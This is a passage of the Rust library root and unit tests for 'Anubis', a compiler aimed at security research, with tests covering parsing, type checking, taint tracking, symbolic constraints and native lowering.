//! Anubis Compiler Library
//! Core of the Anubis language: lexer, parser, typechecker, taint, symbolic, lowering, evidence.
//! v0.1 MVP scope per plan.

pub mod backends;
pub mod doc;
pub mod evidence;
pub mod fmt;
pub mod frontend;
pub mod interp;
pub mod lsp_analysis;
pub mod middle;
pub mod package;
pub mod project;
pub mod resolve;
pub mod selfhost_schema;
pub mod stdlib;

pub use backends::native::lower_to_native;
pub use backends::run::{
    compile_native_rust_to_exe, ANUBIS_RUN_CRYPTO_CACHE_TAG,
};
pub use evidence::{build_evidence_bundle, EvidenceBundle};
pub use frontend::{lex, parse, parse_source, Mode, AST};
pub use middle::{typecheck, typecheck_ex, SymbolicEngine, TaintPass};
pub use project::{AnubisManifest, ProjectLayout};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BuildMode {
    Safe,
    Research,
    Exploit,
}

#[derive(Debug)]
pub struct CompileResult {
    pub success: bool,
    pub mode: BuildMode,
    pub artifact_path: Option<String>,
    pub diagnostics: Vec<String>,
}

impl Default for CompileResult {
    fn default() -> Self {
        Self {
            success: false,
            mode: BuildMode::Safe,
            artifact_path: None,
            diagnostics: vec![],
        }
    }
}

/// Pure Gate 11 verdict function (drives sealer and tests with real data).
pub fn gate11_fixture_verdict(
    id_match: bool,
    both_verify: bool,
    cpu_lane: &str,
    metal_lane: &str,
    journals_match: bool,
) -> &'static str {
    if id_match
        && both_verify
        && cpu_lane == "cpu"
        && metal_lane == "metal-hybrid"
        && journals_match
    {
        "PASS"
    } else if id_match && both_verify && cpu_lane == "cpu" && metal_lane == "cpu" {
        "PARTIAL"
    } else {
        "FAIL"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::{build_evidence_bundle, validate_bundle};
    use crate::frontend::parse_source;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn unique_test_dir(label: &str) -> std::path::PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("clock after epoch")
            .as_nanos();
        std::env::temp_dir().join(format!("anubis-{}-{}-{}", label, std::process::id(), nanos))
    }

    #[test]
    fn parses_safe_program() {
        let src = "fn main() { let x = 1; }";
        let ast = parse_source(src).expect("parse safe");
        assert_eq!(
            ast.items.len(),
            1,
            "safe program should produce one fn item"
        );
    }

    #[test]
    fn parses_while_loop_and_assignment() {
        let src = "fn main() { let i = 0; while i < 3 { i = i + 1; } }";
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diagnostics: {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("expected fn");
        };
        let frontend::Stmt::While { body: wbody, .. } = &body[1] else {
            panic!("expected while statement, got {:?}", body[1]);
        };
        assert!(
            matches!(&wbody[0], frontend::Stmt::Assign { .. }),
            "while body should contain an assignment, got {:?}",
            wbody[0]
        );
    }

    #[test]
    fn parses_unary_and_extended_operators() {
        let src =
            "fn main() { let a = -5; let b = !a; let c = 17 % 5; let d = a != b; let e = a && b; }";
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diagnostics: {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("expected fn");
        };
        let frontend::Stmt::Let { init, .. } = &body[0] else {
            panic!("expected let");
        };
        assert!(
            matches!(init, frontend::Expr::Unary { op, .. } if op == "-"),
            "expected unary negation, got {:?}",
            init
        );
        let frontend::Stmt::Let { init: modinit, .. } = &body[2] else {
            panic!("expected modulo let");
        };
        assert!(
            matches!(modinit, frontend::Expr::Binary { op, .. } if op == "%"),
            "expected modulo operator, got {:?}",
            modinit
        );
    }

    #[test]
    fn parses_else_if_chain_and_recursion() {
        let src = "fn f(n: u32) { if n < 1 { return 0; } else if n < 2 { return 1; } else { return f(n - 1); } } fn main() { let x = f(3); }";
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diagnostics: {:?}",
            parsed.diagnostics
        );
        assert_eq!(parsed.ast.items.len(), 2, "expected two fn items");
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("expected fn f");
        };
        let frontend::Stmt::If { else_, .. } = &body[0] else {
            panic!("expected if with else-if chain, got {:?}", body[0]);
        };
        let else_body = else_.as_ref().expect("else branch present");
        assert!(
            matches!(&else_body[0], frontend::Stmt::If { .. }),
            "else branch should desugar `else if` into a nested if, got {:?}",
            else_body[0]
        );
    }

    #[test]
    fn parses_arrays_indexing_and_for_range() {
        let src = "fn main() { let a = [1, 2, 3]; let x = a[0]; for i in 0..len(a) { a[i] = a[i] + 1; } }";
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diagnostics: {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("expected fn");
        };
        let frontend::Stmt::Let { init, .. } = &body[0] else {
            panic!("expected array let");
        };
        assert!(
            matches!(init, frontend::Expr::ArrayLiteral { elements } if elements.len() == 3),
            "expected 3-element array literal, got {:?}",
            init
        );
        let frontend::Stmt::Let { init: idx, .. } = &body[1] else {
            panic!("expected index let");
        };
        assert!(
            matches!(idx, frontend::Expr::Index { .. }),
            "expected index expression, got {:?}",
            idx
        );
        assert!(
            matches!(&body[2], frontend::Stmt::For { var, .. } if var == "i"),
            "expected for-loop, got {:?}",
            body[2]
        );
    }

    #[test]
    fn parses_for_in_collection() {
        let src = r#"
        fn main() {
            let xs = [1, 2, 3];
            let s = 0;
            for x in xs {
                s = s + x;
            }
            return s;
        }
        "#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "diags: {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("fn");
        };
        let has_col = body.iter().any(|s| {
            matches!(
                s,
                frontend::Stmt::For {
                    source: frontend::ForSource::Collection { .. },
                    ..
                }
            )
        });
        assert!(has_col, "expected for-in collection: {:?}", body);
        typecheck(parsed.ast, frontend::Mode::Safe).expect("tc");
    }

    #[test]
    fn parses_if_expression_with_else_if() {
        let src =
            "fn main() { let n = 3; let r = if n > 2 { n + 4 } else if n == 0 { 1 } else { 0 }; }";
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "diags: {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("fn");
        };
        let frontend::Stmt::Let { init, .. } = &body[1] else {
            panic!("expected let r, got {:?}", body[1]);
        };
        assert!(
            matches!(init, frontend::Expr::If { .. }),
            "expected if-expression, got {:?}",
            init
        );
        typecheck(parsed.ast, frontend::Mode::Safe).expect("tc");
    }

    #[test]
    fn parses_map_literal_and_index() {
        let src = r#"fn main() { let m = { "a": 1, "b": 2 }; let x = m["a"]; m["c"] = 3; }"#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "diags: {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("fn");
        };
        let frontend::Stmt::Let { init, .. } = &body[0] else {
            panic!("expected map let");
        };
        assert!(
            matches!(init, frontend::Expr::MapLiteral { entries, .. } if entries.len() == 2),
            "expected 2-entry map, got {:?}",
            init
        );
        typecheck(parsed.ast, frontend::Mode::Safe).expect("tc");
    }

    #[test]
    fn parses_struct_like_enum_variant_and_match() {
        let src = r#"
        enum ApiErr {
            None,
            Fail { code: u32, hint: u32 },
        }
        fn main() {
            let e = ApiErr::Fail { code: 99, hint: 1 };
            let c = match e {
                ApiErr::None => 0,
                ApiErr::Fail { code: c, hint: _h } => c,
                _ => 1,
            };
            return c;
        }
        "#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "diags: {:?}",
            parsed.diagnostics
        );
        assert!(
            matches!(&parsed.ast.items[0], frontend::Item::Enum { variants, .. }
                if variants.iter().any(|v| matches!(v.kind, frontend::EnumVariantKind::Struct(_)))),
            "expected struct-like variant: {:?}",
            parsed.ast.items[0]
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[1] else {
            panic!("fn");
        };
        let frontend::Stmt::Let { init, .. } = &body[0] else {
            panic!("enum construct let");
        };
        match init {
            frontend::Expr::EnumConstruct { field_names, .. } => {
                assert_eq!(
                    field_names.as_slice(),
                    ["code", "hint"],
                    "expected struct field names"
                );
            }
            other => panic!("expected struct construct, got {:?}", other),
        }
        typecheck(parsed.ast, frontend::Mode::Safe).expect("tc");
    }

    #[test]
    fn a_plus_rejects_bool_for_u32_param() {
        let src = r#"
        fn add(x: u32, y: u32) { return x + y; }
        fn main() {
            let r = add(true, "hi");
            print(r);
        }
        "#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "diags: {:?}",
            parsed.diagnostics
        );
        let err = typecheck(parsed.ast, frontend::Mode::Safe).expect_err("must type-error");
        assert!(
            err.contains("ANUBIS_TYPE_MISMATCH"),
            "expected type mismatch, got: {err}"
        );
    }

    /// Phase 2, first slice: a float value must not narrow into an integer annotation. The runtime
    /// is dynamically typed (the `u32` is inert and the float survives), so this is a checker-level
    /// rejection of a definite type lie — the same category as the already-rejected string→int, not
    /// an undecidable case. Helper: does `src` type-check (Ok) or is it rejected (Err)?
    fn tc_ok(src: &str) -> Result<(), String> {
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "parse diags: {:?}",
            parsed.diagnostics
        );
        typecheck(parsed.ast, frontend::Mode::Safe).map(|_| ())
    }

    #[test]
    fn float_does_not_narrow_into_integer_let_binding() {
        let err = tc_ok("fn main() { let x: u32 = 3.14; print(x); }")
            .expect_err("float into u32 annotation must be rejected");
        assert!(err.contains("ANUBIS_TYPE_MISMATCH"), "got: {err}");
        // tainted wrapper must not hide it (research mode where tainted is legal).
        let src = "fn main() { research { let x: tainted<u32> = 3.14; sink(x); } }";
        let parsed = frontend::parse_source_detailed(src);
        let res = typecheck(parsed.ast, frontend::Mode::Research);
        assert!(
            res.is_err() && res.unwrap_err().contains("ANUBIS_TYPE_MISMATCH"),
            "float into tainted<u32> must still be rejected"
        );
    }

    #[test]
    fn float_narrowing_rejected_in_return_and_argument_position() {
        let ret = tc_ok("fn f() -> u32 { return 3.14; } fn main() { let x = f(); print(x); }")
            .expect_err("returning a float from a -> u32 fn must be rejected");
        assert!(
            ret.contains("ANUBIS_RETURN_TYPE_MISMATCH") || ret.contains("ANUBIS_TYPE_MISMATCH"),
            "got: {ret}"
        );
        let arg = tc_ok("fn g(n: u32) { print(n); } fn main() { g(3.14); }")
            .expect_err("passing a float to a u32 parameter must be rejected");
        assert!(arg.contains("ANUBIS_TYPE_MISMATCH"), "got: {arg}");
    }

    #[test]
    fn float_narrowing_arithmetic_is_symmetric_over_operand_order() {
        // `anubis_add/sub/mul/div/mod` return Float on ANY float operand, so a float on EITHER side of a
        // `+ - * / %` makes the result a float; narrowing it into an integer slot must reject regardless
        // of operand order (the LHS-first inference accepted `2 + 1.5` while rejecting `1.5 + 2`).
        for src in [
            "fn main() { let x: u32 = 2 + 1.5; print(x); }",
            "fn main() { let x: u32 = 1.5 + 2; print(x); }",
            "fn main() { let x: u32 = 2 - 1.5; print(x); }",
            "fn main() { let x: u32 = 2 * 1.5; print(x); }",
            "fn main() { let x: u32 = 3 / 1.5; print(x); }",
        ] {
            let err = tc_ok(src).expect_err("a float-arithmetic result must not narrow into u32");
            assert!(err.contains("ANUBIS_TYPE_MISMATCH"), "{src} — got: {err}");
        }
        // Controls that MUST still accept: pure-integer arithmetic, and the float result into a float slot.
        tc_ok("fn main() { let x: u32 = 2 + 3; print(x); }").expect("integer arithmetic still narrows");
        tc_ok("fn main() { let x: f64 = 2 + 1.5; print(x); }").expect("float result into f64 accepts");
        // Bitwise/shift stay INTEGER even with a float operand (anubis_band/shl as_i64) — must accept.
        tc_ok("fn main() { let avg = (4.0 + 6.0) / 2.0; let b: u32 = avg & 7; print(b); }")
            .expect("bitwise on a float operand is integer and still narrows");
    }

    #[test]
    fn narrowing_rule_does_not_reject_running_programs_adversary_regressions() {
        // Regressions for false positives found by the `assignable-adversary` workflow: expressions
        // the RUNTIME makes integer must not be inferred float and wrongly rejected. Each of these
        // runs and yields an integer, so `check` must accept them (the prime rule: a running program
        // is not rejected unless it is a DEFINITE type error).
        // (1) Bitwise/shift are always integer at runtime even over float operands.
        tc_ok("fn main() { let avg = (4.0 + 6.0) / 2.0; let b: u32 = avg & 7; print(b); }")
            .expect("bitwise-AND over a float is integer at runtime — must not reject");
        tc_ok("fn main() { let f = 5.0; let s: u32 = f << 2; print(s); }")
            .expect("shift is integer at runtime — must not reject");
        tc_ok("fn take(n: u32) { print(n); } fn main() { let v = 6.0; take(v & 3); }")
            .expect("bitwise arg is integer at runtime — must not reject");
        // (2) An `if`/`match` whose taken branch is the integer one is not definitely float.
        tc_ok("fn main() { let x: u32 = if false { 3.14 } else { 5 }; print(x); }")
            .expect("mixed if-branches are not definitely float — must not reject");
        tc_ok("fn main() { let x: u32 = match 1 { 0 => 3.14, _ => 7 }; print(x); }")
            .expect("mixed match-arms are not definitely float — must not reject");
        // Guard: an if/match whose EVERY statically-inferable branch is float still narrows — order
        // independently, and through a block's tail expression (Round-2 regression guards).
        for lie in [
            "fn main() { let c = true; let x: u32 = if c { 3.14 } else { 2.71 }; print(x); }",
            // float in the SECOND branch — order independence (Round-2 regression guard).
            "fn main() { let c = true; let x: u32 = if c { 5.0 } else { 6.0 }; print(x); }",
            "fn main() { let x: u32 = match 0 { 0 => 1.5, _ => 2.5 }; print(x); }",
        ] {
            let err = tc_ok(lie).expect_err("all-float branch value must narrow-reject");
            assert!(
                err.contains("ANUBIS_TYPE_MISMATCH"),
                "for {lie:?} got: {err}"
            );
        }
    }

    #[test]
    fn integer_to_float_widening_and_width_interop_still_accepted() {
        // These MUST keep type-checking — the rule is directional, and rejecting any of them would
        // be a false positive against a working program (the "never reject the decidable-good" side).
        tc_ok("fn main() { let r: f64 = 3; print(r); }").expect("int widens into f64");
        tc_ok("fn main() { let r: float = 7; print(r); }").expect("int widens into float");
        tc_ok("fn main() { let a: u32 = 5; let b: u8 = 3; print(a + b); }")
            .expect("integer width interop unaffected");
        tc_ok("fn main() { let x: f64 = 3.14; print(x); }").expect("float into f64 is fine");
        tc_ok("fn frac() -> f64 { return 3.14; } fn main() { print(frac()); }")
            .expect("float return into f64 is fine");
    }

    #[test]
    fn a_plus_match_non_exhaustive_fails_closed() {
        let src = r#"
        enum V { A, B, C }
        fn main() {
            let v = V::A;
            let x = match v {
                V::A => 1,
            };
            return x;
        }
        "#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "diags: {:?}",
            parsed.diagnostics
        );
        let err = typecheck(parsed.ast, frontend::Mode::Safe).expect_err("must non-exhaustive");
        assert!(
            err.contains("ANUBIS_MATCH_NON_EXHAUSTIVE"),
            "expected non-exhaustive, got: {err}"
        );
    }

    #[test]
    fn a_plus_match_with_wildcard_is_exhaustive() {
        let src = r#"
        enum V { A, B }
        fn main() {
            let v = V::A;
            let x = match v {
                V::A => 1,
                _ => 0,
            };
            return x;
        }
        "#;
        let parsed = frontend::parse_source_detailed(src);
        typecheck(parsed.ast, frontend::Mode::Safe).expect("wildcard exhausts");
    }

    #[test]
    fn header_position_is_not_a_struct_literal() {
        // `while running { .. }` and `for i in 0..n { .. }` must NOT parse `running`/`n` as a
        // struct literal; the `{` starts the loop body. Regression for a parser hang.
        let src = "fn main() { let running = true; let n = 3; while running { running = false; } for i in 0..n { let z = i; } }";
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diagnostics (struct-literal-in-header ambiguity?): {:?}",
            parsed.diagnostics
        );
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("expected fn");
        };
        assert!(
            matches!(&body[2], frontend::Stmt::While { .. }),
            "expected while loop, got {:?}",
            body[2]
        );
        assert!(
            matches!(&body[3], frontend::Stmt::For { .. }),
            "expected for loop, got {:?}",
            body[3]
        );
    }

    #[test]
    fn parser_records_spans_params_and_precedence() {
        let src = "fn add(x: u32, y: u32) { let z = x + y * 3; }";
        let parsed = frontend::parse_source_detailed(src);

        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diagnostics: {:?}",
            parsed.diagnostics
        );
        assert_eq!(parsed.ast.items.len(), 1);
        let it0 = &parsed.ast.items[0];
        let (name, params, body, span) = if let frontend::Item::Fn {
            name,
            params,
            body,
            span,
            ..
        } = it0
        {
            (name.clone(), params.clone(), body.clone(), *span)
        } else if matches!(it0, frontend::Item::Struct { .. }) {
            // struct fixture for Gate2/3; skip detailed fn assertions
            (
                "dummy".to_string(),
                vec![],
                vec![],
                frontend::Span { start: 0, end: 0 },
            )
        } else {
            panic!("expected function item: {:?}", it0);
        };
        if name != "dummy" {
            assert_eq!(name, "add");
            assert_eq!(
                params,
                vec![
                    ("x".to_string(), "u32".to_string()),
                    ("y".to_string(), "u32".to_string())
                ]
            );
            assert_eq!(span.start, 0);
            assert_eq!(span.end, src.len());

            let frontend::Stmt::Let {
                init,
                span: let_span,
                ..
            } = &body[0]
            else {
                panic!("expected let statement: {:?}", body);
            };
            assert_eq!(&src[let_span.start..let_span.end], "let z = x + y * 3;");
            let frontend::Expr::Binary { op, lhs, rhs } = init else {
                panic!("expected binary expression: {:?}", init);
            };
            assert_eq!(op, "+");
            assert!(matches!(&**lhs, frontend::Expr::Var(v) if v == "x"));
            let frontend::Expr::Binary {
                op: rhs_op,
                lhs: rhs_lhs,
                rhs: rhs_rhs,
            } = &**rhs
            else {
                panic!("expected multiplication on RHS: {:?}", rhs);
            };
            assert_eq!(rhs_op, "*");
            assert!(matches!(&**rhs_lhs, frontend::Expr::Var(v) if v == "y"));
            let _ = rhs_rhs; // placeholder for slice
        } else {
            // struct path - assertions skipped for Gate2/3 struct fixture
        }
    }

    #[test]
    fn parser_reports_spanned_diagnostics_and_recovers() {
        // A stray token between statements is reported with a span, and the parser
        // recovers to parse the following statement. (Note: a trailing `;` is optional
        // on every statement kind — including `let` — so a missing semicolon is not an
        // error; the diagnostic machinery is exercised here with a genuine stray token.)
        let src = "fn main() { let a = 1; , let b = 2; }";
        let parsed = frontend::parse_source_detailed(src);

        assert_eq!(parsed.ast.items.len(), 1);
        let frontend::Item::Fn { body, .. } = &parsed.ast.items[0] else {
            panic!("expected function item: {:?}", parsed.ast.items[0]);
        };
        assert_eq!(
            body.len(),
            2,
            "parser should recover past the stray token and parse both bindings: {:?}",
            body
        );
        let diag = parsed
            .diagnostics
            .iter()
            .find(|d| d.message.contains("expected statement"))
            .unwrap_or_else(|| panic!("expected a spanned diagnostic: {:?}", parsed.diagnostics));
        assert!(
            src[diag.span.start..].starts_with(','),
            "diagnostic span should point at the stray `,`: start={} src={:?}",
            diag.span.start,
            src
        );
    }

    #[test]
    fn parses_enum_and_match() {
        let src = r#"
        enum Status { Ok, Err(u32), Pending }
        fn main() {
            let s = Status::Err(7);
            let c = match s {
                Status::Ok => 0,
                Status::Err(n) => n,
                Status::Pending => 1,
                _ => 9,
            };
            return c;
        }
        "#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "unexpected diags: {:?}",
            parsed.diagnostics
        );
        assert!(
            parsed.ast.items.iter().any(|it| {
                matches!(
                    it,
                    frontend::Item::Enum { name, variants, .. }
                        if name == "Status" && variants.len() == 3
                )
            }),
            "expected Status enum: {:?}",
            parsed.ast.items
        );
        let frontend::Item::Fn { body, .. } = parsed
            .ast
            .items
            .iter()
            .find(|it| matches!(it, frontend::Item::Fn { name, .. } if name == "main"))
            .expect("main")
        else {
            panic!("fn");
        };
        let has_match = body.iter().any(|s| {
            matches!(
                s,
                frontend::Stmt::Let {
                    init: frontend::Expr::Match { arms, .. },
                    ..
                } if arms.len() == 4
            )
        });
        assert!(has_match, "expected match with 4 arms: {:?}", body);
        typecheck(parsed.ast, frontend::Mode::Safe).expect("typecheck enum program");
    }

    #[test]
    fn parses_research_with_tainted_and_symbolic() {
        let src = r#"
        fn poc() {
            research {
                // intent: "demo overflow"
                let p: tainted<*mut u8> = 0 as *mut u8;
                let s = symbolic::<u32>();
                assume(s < 100);
                assert(s > 0);
            }
        }
        "#;
        let ast = parse_source(src).expect("parse research");
        // Assert on real AST structure produced by the shipped parser
        let has_research_block_with_tainted = ast.items.iter().any(|it| {
            if let frontend::Item::Fn { body, .. } = it {
                body.iter().any(|s| {
                    if let frontend::Stmt::ResearchBlock { body: bb, .. } = s {
                        bb.iter().any(|bs| {
                            if let frontend::Stmt::Let { ty: Some(t), .. } = bs {
                                t.contains("tainted")
                            } else {
                                false
                            }
                        })
                    } else {
                        false
                    }
                })
            } else {
                false
            }
        });
        assert!(
            has_research_block_with_tainted,
            "AST should contain ResearchBlock with tainted Let"
        );
        let ir = typecheck(ast, frontend::Mode::Research).expect("typecheck");
        assert!(ir.has_research);
        assert!(
            ir.taint_labels.iter().any(|l| l.contains("tainted")),
            "taint labels: {:?}",
            ir.taint_labels
        );
        assert!(!ir.constraints.is_empty());
        let cons = SymbolicEngine::generate_constraints(src);
        assert!(cons
            .iter()
            .any(|c| c.contains("assert") || c.contains("declare-const")));
    }

    #[test]
    fn mainless_research_snippet_lowers_to_honest_analysis_marker() {
        // research_poc.anubis is an analysis-only snippet (`fn trigger`, no `fn main`). The keystone
        // routes build/prove through the same faithful lowering as `anubis run`, which cannot run a
        // program with no entry point. Instead of the retired template that FAKED a
        // `poc_memory_op_executed` line, we now emit an HONEST analysis-only marker; the substantive
        // taint/symbolic results live in the evidence bundle.
        let src = include_str!("../../examples/research_poc.anubis");
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast.clone(), frontend::Mode::Research).expect("typecheck");
        let out_dir = unique_test_dir("mainless-research-marker");
        std::fs::create_dir_all(&out_dir).unwrap();

        let exe_path =
            lower_to_native(ir, &ast.items, &out_dir, "poc_lower", false).expect("lower");
        let emitted = std::fs::read_to_string(out_dir.join("poc_lower.rs")).expect("read emitted");

        assert!(
            emitted.contains("analysis-only artifact"),
            "must emit the honest analysis-only marker: {}",
            emitted
        );
        assert!(
            !emitted.contains("poc_memory_op_executed"),
            "must not fabricate a PoC memory op for a non-runnable snippet: {}",
            emitted
        );
        assert!(
            std::path::Path::new(&exe_path).exists(),
            "marker binary must exist after lower"
        );

        let run = std::process::Command::new(&exe_path)
            .output()
            .expect("run marker");
        let out = String::from_utf8_lossy(&run.stdout);
        assert!(
            out.contains("analysis-only artifact") && out.contains("not directly executable"),
            "marker must truthfully report analysis-only status at runtime: {}",
            out
        );
        assert!(
            !out.contains("poc_memory_op_executed"),
            "runtime must not fake a PoC op: {}",
            out
        );
        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn research_snippet_without_assume_lowers_via_faithful_path_gate_retired() {
        // Retires honesty-debt item 0.3: the old "research lowering requires assume(...) bound" was
        // a brittle template gate. With the faithful lowering, a main-less research snippet lowers
        // to an honest analysis-only marker — it SUCCEEDS rather than fabricating a gate error.
        // Real safe-mode enforcement (raw pointers, tainted sinks) still lives in `typecheck`,
        // upstream of lowering, so nothing is weakened.
        let src = r#"
fn trigger() {
    research {
        let x: tainted<u32> = symbolic();
        assert(x > 0);
    }
}
"#;
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast.clone(), frontend::Mode::Research).expect("typecheck");
        let out_dir = unique_test_dir("assume-gate-retired");
        std::fs::create_dir_all(&out_dir).unwrap();

        let exe_path = lower_to_native(ir, &ast.items, &out_dir, "no_assume", false)
            .expect("faithful lowering emits an honest marker, not a brittle gate error");
        let emitted = std::fs::read_to_string(out_dir.join("no_assume.rs")).expect("read emitted");
        assert!(
            emitted.contains("analysis-only artifact"),
            "must emit honest marker for the main-less snippet: {}",
            emitted
        );
        assert!(
            std::path::Path::new(&exe_path).exists(),
            "marker binary must exist"
        );
        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn research_constraints_include_nested_assume_and_assert() {
        let src = r#"
fn trigger() {
    research {
        let y: tainted<u32> = symbolic();
        assume(y < 77);
        assert(y > 0);
    }
}
"#;
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast, frontend::Mode::Research).expect("typecheck");

        assert!(
            ir.constraints
                .iter()
                .any(|c| c.contains("bvslt anb_y") || c.contains("(< anb_y 77)")),
            "constraints must include nested assume(y < 77), got {:?}",
            ir.constraints
        );
        assert!(
            ir.constraints
                .iter()
                .any(|c| c.contains("bvsgt anb_y") || c.contains("(> anb_y 0)")),
            "constraints must include nested assert(y > 0), got {:?}",
            ir.constraints
        );
        assert!(
            !ir.constraints.iter().any(|c| c == "(assert true)"),
            "real nested constraints must not collapse to default true: {:?}",
            ir.constraints
        );
    }

    #[test]
    fn research_snippet_taint_reflected_in_honest_marker() {
        // A main-less research snippet with a tainted `y` now lowers to an honest analysis-only
        // marker whose runtime summary reports the taint analysis, instead of the retired template
        // that faked a "wrote at idx N" memory op.
        let src = r#"
fn trigger() {
    research {
        let y: tainted<u32> = symbolic();
        assume(y < 77);
        assert(y > 0);
    }
}
"#;
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast.clone(), frontend::Mode::Research).expect("typecheck");
        let out_dir = unique_test_dir("taint-marker");
        std::fs::create_dir_all(&out_dir).unwrap();

        let exe_path =
            lower_to_native(ir, &ast.items, &out_dir, "taint_marker", false).expect("lower");
        let emitted =
            std::fs::read_to_string(out_dir.join("taint_marker.rs")).expect("read emitted");
        assert!(
            emitted.contains("analysis-only artifact"),
            "must emit honest marker: {}",
            emitted
        );
        assert!(
            !emitted.contains("wrote at idx"),
            "must not fabricate a memory-write op: {}",
            emitted
        );

        let run = std::process::Command::new(&exe_path)
            .output()
            .expect("run marker");
        let stdout = String::from_utf8_lossy(&run.stdout);
        assert!(
            stdout.contains("taint:"),
            "marker must report the taint analysis summary at runtime: {}",
            stdout
        );
        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn build_of_program_with_main_emits_faithful_runnable_artifact() {
        // Keystone fidelity: a safe program with `fn main` now lowers through the SAME faithful path
        // as `anubis run`, so the native artifact executes the REAL program — not the retired
        // "safe_execution" stub. This is the core of the backend-unification keystone.
        let src = "fn main() { print(\"hello-from-build\"); print(6 * 7); }";
        let ast = parse_source(src).expect("parse");
        let ir = typecheck(ast.clone(), frontend::Mode::Safe).expect("typecheck");
        let out_dir = unique_test_dir("faithful-build");
        std::fs::create_dir_all(&out_dir).unwrap();

        let exe_path =
            lower_to_native(ir, &ast.items, &out_dir, "real_prog", false).expect("lower");
        let emitted = std::fs::read_to_string(out_dir.join("real_prog.rs")).expect("read emitted");
        assert!(
            !emitted.contains("safe_execution"),
            "faithful lowering must not emit the retired safe_execution stub: {}",
            emitted
        );

        let run = std::process::Command::new(&exe_path)
            .output()
            .expect("run real program");
        let out = String::from_utf8_lossy(&run.stdout);
        assert!(
            out.contains("hello-from-build") && out.contains("42"),
            "native artifact must run the real program (print + 6*7=42): {}",
            out
        );
        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn parses_hybrid_and_spec_blocks() {
        let src =
            r#"fn h() { hybrid { gpu(metal){} cpu{} prove(risc0){ spec { forall x . true } } } }"#;
        let ast = parse_source(src).expect("parse hybrid");
        let ir = typecheck(ast.clone(), frontend::Mode::Safe).expect("tc");
        // parser populates hybrid stmt even if coarse
        // we only require no panic and mode handling
        assert!(ir.mode == BuildMode::Safe);
        let metal_ref = std::env::var("ANUBIS_RISC0_METAL_REFERENCE").unwrap_or_default();
        if metal_ref.is_empty()
            || !std::path::Path::new(&metal_ref)
                .join("vendor/risc0-circuit-rv32im/src/prove/hal/metal.rs")
                .exists()
        {
            eprintln!("SKIP parses_hybrid_and_spec_blocks: ANUBIS_RISC0_METAL_REFERENCE not set or vendored crate missing");
            return;
        }
        // strengthen: lower and check real keywords in .rs (no stubs)
        let out = unique_test_dir("hybrid-lower");
        std::fs::create_dir_all(&out).unwrap();
        let _ = lower_to_native(ir, &ast.items, &out, "hybrid_test", false);
        let rs = std::fs::read_to_string(out.join("hybrid_test.rs")).unwrap_or_default();
        assert!(
            rs.contains("StorageModeShared") || rs.contains("metal"),
            "lowered hybrid .rs must contain real StorageModeShared/metal dispatch pattern"
        );
        // RISC0 prove path is in full template; fast demonstrates metal. The gate test verifies actual build+run of real dispatch.
        let _ = std::fs::remove_dir_all(&out);
    }

    #[test]
    fn taint_propagates() {
        let src = "fn t() { let x: tainted<u32> = symbolic(); }";
        let ast = parse_source(src).unwrap();
        let ir = typecheck(ast, frontend::Mode::Safe).unwrap();
        let after = TaintPass::apply(ir.clone());
        assert!(after.taint_labels.len() >= ir.taint_labels.len());
    }

    #[test]
    fn parser_accepts_imports_and_modules_with_recovery() {
        let src = r#"
import bounty.net;

module poc {
    fn entry(input: tainted<u32>) {
        research {
            let x: tainted<u32> = symbolic();
            assume(x <= 77);
            assert(x > 0);
        }
    }
}
"#;
        let parsed = frontend::parse_source_detailed(src);
        assert!(
            parsed.diagnostics.is_empty(),
            "module/import program must parse without diagnostics: {:?}",
            parsed.diagnostics
        );
        assert!(
            parsed.ast.items.iter().any(
                |item| matches!(item, frontend::Item::Import { path, .. } if path == "bounty.net")
            ),
            "AST should retain import item: {:?}",
            parsed.ast.items
        );
        assert!(
            parsed.ast.items.iter().any(|item| {
